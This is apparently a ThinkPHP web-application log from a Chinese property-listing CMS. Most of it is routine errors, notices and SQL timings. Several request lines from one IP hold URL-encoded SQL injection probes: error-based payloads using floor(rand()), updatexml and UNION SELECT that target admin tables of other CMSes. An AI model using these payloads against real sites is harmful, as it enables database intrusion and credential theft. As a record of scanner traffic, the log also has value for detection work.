+[ 2015-10-14T11:55:13+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:17+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:17+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:18+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:18+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:19+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:19+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:20+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:20+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:21+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:21+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:22+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:22+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:22+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:23+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:23+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:24+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:24+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:25+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:25+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:26+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:26+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:27+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:27+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:31+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:31+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:32+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:32+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:33+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:33+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:34+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:34+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:38+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:38+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:39+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:39+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:42+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:43+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:43+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:44+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:44+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:45+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:45+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:46+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:46+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:47+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:47+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:48+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:48+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:48+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:52+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:52+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:53+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:53+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:54+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:54+08:00 ] ERR: (ThinkException) 无法加载模块:Agent
+[ 2015-10-14T11:55:55+08:00 ] 121.42.0.39 /index.php?g=Wap&m=Agent&a=loupanInfo&code=021c872c4c0c25e2b73ac07c09e9dedD&state=594&from=timeline&isappinstalled=0
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000637s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000785s ]
+NOTIC: [8] Undefined index:  id D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 183 行.
+NOTIC: [8] Undefined index:  token D:\www\qmyx.wuyelaile.com\weiwincms\Lib\Action\Wap\AgentAction.class.php 第 186 行.
+SQL: SHOW COLUMNS FROM `wy_lpinfo` [ RunTime:0.018864s ]
+SQL: UPDATE `wy_lpinfo` SET `video`=video+1 WHERE ( `id` = null ) AND ( `token` = null ) [ RunTime:0.000414s ]
+SQL: SELECT * FROM `wy_lpinfo` WHERE ( `id` = null ) AND ( `token` = null ) LIMIT 1   [ RunTime:0.000307s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.044370s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002541s ]
+INFO: [ view_parse ] --START--
+NOTIC: [8] Undefined variable: url D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 22 行.
+NOTIC: [8] Undefined variable: jjrarr D:\www\qmyx.wuyelaile.com\weiwindata\logs\Cache\Wap\15cb069a79c1a70eb570b5aca2bb66be.php 第 139 行.
+INFO: Run ParseTemplate Behavior [ RunTime:-0.047026s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.022012s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.069097s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.071113s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.072559s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.073915s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006728s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.075932s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001924s ]
+
+[ 2015-10-14T11:56:37+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001088s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001223s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.059803s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000210s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.084594s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002323s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.086997s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021977s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.109059s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.110572s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.112143s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.115630s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.008705s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.117875s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001992s ]
+
+[ 2015-10-14T11:56:43+08:00 ] 121.42.0.39 /
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000681s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000815s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.030944s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000296s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.051643s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002300s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.054022s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020649s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.074741s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.076149s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.077581s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.078810s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005538s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.080382s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001594s ]
+
+[ 2015-10-14T11:56:43+08:00 ] 121.42.0.39 /?1016%27and%28select%2F**%2Fmd5%28233333%29%2F**%2Ffrom%28select%2F**%2Fcount%28*%29%2Cconcat%28%28select%2F**%2F%28select%2F**%2F%28select%2F**%2Fconcat%280x27%2C0x7e%2Cmd5%28233333%29%2C0x27%2C0x7e%2C0x7e%2C0x27%2C0x7e%29%2F**%2Ffrom%2F**%2F%7BP%7D_product_con%2F**%2Flimit%2F**%2F0%2C1%29%29%2F**%2Ffrom%2F**%2Finformation_schema.tables%2F**%2Flimit%2F**%2F0%2C1%29%2Cfloor%28rand%280%29*2%29%29x%2F**%2Ffrom%2F**%2Finformation_schema.tables%2F**%2Fgroup%2F**%2Fby%2F**%2Fx%29a%29%2F*.html
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000627s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000772s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.036286s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000239s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.055243s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002764s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.058168s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021913s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.080052s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.081507s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.083099s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.084366s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005851s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.086003s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001890s ]
+
+[ 2015-10-14T12:00:38+08:00 ] 121.42.0.39 /?controller=classify&project=article&classify=&classid=2'%20%20UNION%20SELECT%20*%20FROM%20((SELECT%20admin%20from%20f_manage)a%20JOIN%20(SELECT%202)b%20JOIN%20(SELECT%20md5(233333)%20from%20f_manage)c)%20%23
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.002674s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002904s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.037054s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000340s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.064933s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002849s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.067899s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021951s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.089909s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.091388s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.092902s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.094163s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005844s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.095854s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001720s ]
+
+[ 2015-10-14T12:00:41+08:00 ] ERR: (ThinkException) 无法加载模块:Goods
+[ 2015-10-14T12:00:42+08:00 ] 121.42.0.39 /index.php?ac=search&at=taglist&tagkey=%2527%2Ctags%29+or%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%28md5%283.1415%29%29%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29%23
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001094s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001230s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.032319s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000577s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.054989s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002344s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.057396s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.018304s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.075776s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.077241s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.078718s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.079935s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005644s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.081561s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001634s ]
+
+[ 2015-10-14T12:01:19+08:00 ] 42.96.164.59 /index.php?admin_dir=admin&site=default&ishtml=1
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001600s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001738s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.036793s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000253s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.069152s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002333s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.071568s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.018150s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.089790s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.091553s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.093209s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.094453s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006160s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.096053s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001821s ]
+
+[ 2015-10-14T12:01:43+08:00 ] ERR: (ThinkException) 无法加载模块:tg/admin
+[ 2015-10-14T12:01:44+08:00 ] ERR: (ThinkException) 无法加载模块:search
+[ 2015-10-14T12:01:58+08:00 ] 121.42.0.39 /
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.000599s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000771s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.047798s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000254s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.073143s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002440s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.075666s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019246s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.094989s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.096399s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.097900s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.099233s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006075s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.101191s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002254s ]
+
+[ 2015-10-14T12:02:02+08:00 ] ERR: (ThinkException) 无法加载模块:vote
+[ 2015-10-14T12:02:37+08:00 ] 121.42.0.39 /index.php?act=show_groupbuy&op=groupbuy_list&id=1&groupbuy_order_key=price&groupbuy_order=%20%20and%20%28select%201%20from%20%20%28select%20count%28*%29,concat%28md5%28233333%29,floor%28rand%280%29*2%29%29x%20from%20%20information_schema.tables%20group%20by%20x%29a%29%20--
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001610s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001761s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.034767s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000248s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.063236s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002451s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.065764s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.022769s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.088657s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.090117s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.094330s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.095752s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.008678s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.097486s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001696s ]
+
+[ 2015-10-14T12:02:45+08:00 ] 121.42.0.39 /index.php?edition-compare-1
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001593s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001844s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.035350s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000243s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.062346s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002338s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.064780s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021870s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.086706s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.088154s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.089655s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.090931s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005828s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.092633s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001908s ]
+
+[ 2015-10-14T12:02:47+08:00 ] 121.42.0.39 /?cart-46-157)and(1)=(updatexml(1,concat(0x23,(select(md5(233333))from(sdb_operators)),0x23),1))%23-addGoodsToCart.html
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001506s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001648s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.031323s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000214s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.056501s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002390s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.058974s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021150s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.080197s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.081648s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.083109s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.084345s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005690s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.085985s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001620s ]
+
+[ 2015-10-14T12:03:11+08:00 ] 121.42.0.39 /index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=-1+union+all+select+1,concat_ws(0x3a,0x3a,md5(233333),0x3a),3,4,5,6,7,8,9
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001591s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001739s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.034791s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000238s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.060019s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002308s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.062411s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021024s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.083523s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.085020s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.086574s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.087826s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006081s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.089722s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002284s ]
+
+[ 2015-10-14T12:03:12+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001061s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001198s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.046859s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000375s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.076897s ]
+INFO: [ view_template ] --END-- [ RunTime:0.003157s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.080147s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019132s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.099348s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.100901s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.103297s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.104590s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006825s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.106273s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001770s ]
+
+[ 2015-10-14T12:07:57+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001639s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001790s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.105211s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000234s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.135239s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002623s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.138047s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.030018s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.168127s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.169794s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.172654s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.174675s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.008458s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.176706s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001847s ]
+
+[ 2015-10-14T12:07:58+08:00 ] 121.42.0.39 /index.php
+INFO: [ app_begin ] --START--
+INFO: Run ReadHtmlCache Behavior [ RunTime:0.001952s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002146s ]
+SQL: SHOW COLUMNS FROM `wy_links` [ RunTime:0.036206s ]
+SQL: SELECT * FROM `wy_links` WHERE ( `status` = 1 )  [ RunTime:0.000312s ]
+NOTIC: [2] Cannot use a scalar value as an array D:\www\qmyx.wuyelaile.com\weiwincms\_Core\Lib\Core\View.class.php 第 69 行.
+INFO: [ view_template ] --START--
+INFO: Run LocationTemplate Behavior [ RunTime:-0.062148s ]
+INFO: [ view_template ] --END-- [ RunTime:0.002030s ]
+INFO: [ view_parse ] --START--
+INFO: Run ParseTemplate Behavior [ RunTime:-0.064262s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020636s ]
+INFO: [ view_filter ] --START--
+INFO: Run ContentReplace Behavior [ RunTime:-0.084980s ]
+INFO: Run TokenBuild Behavior [ RunTime:-0.086493s ]
+INFO: Run WriteHtmlCache Behavior [ RunTime:-0.087358s ]
+INFO: Run ShowRuntime Behavior [ RunTime:-0.088695s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005473s ]
+INFO: [ view_end ] --START--
+INFO: Run ShowPageTrace Behavior [ RunTime:-0.090552s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001712s ]
+
